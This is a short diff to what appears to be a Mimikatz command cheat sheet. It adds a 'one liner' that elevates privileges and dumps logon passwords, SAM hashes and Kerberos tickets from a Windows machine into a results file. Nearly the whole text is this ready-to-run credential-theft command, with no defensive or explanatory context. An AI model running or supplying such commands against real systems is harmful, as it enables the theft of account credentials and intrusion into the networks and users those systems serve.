@@ -38,3 +38,8 @@ tickets dump
 ```
 sekurlsa::tickets
 ```
+
+# one liner
+```
+.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets" exit > mimikatz_result.txt
+```
